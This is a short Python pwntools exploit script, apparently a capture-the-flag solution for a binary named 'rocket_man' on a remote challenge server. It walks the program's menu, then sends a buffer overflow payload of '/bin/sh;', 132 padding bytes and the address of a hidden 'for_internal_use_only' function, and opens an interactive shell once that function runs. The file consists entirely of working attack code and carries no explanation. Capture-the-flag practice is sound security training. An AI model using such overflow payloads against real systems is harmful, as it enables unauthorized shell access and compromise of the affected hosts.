# coding: utf-8
from pwn import *

context.binary = elf = ELF('./rocket_man')
# p = process('./rocket_man')
p = remote('challenges1.whitehacks.xyz', 53901)


p.sendline("2")
p.sendline("1")
p.sendline("1")
p.sendline("2")
p.sendline(b"/bin/sh;" + b"B"*132 + p64(elf.sym.for_internal_use_only))

# run internal_use_only and get shell
p.sendline("3")

p.interactive()
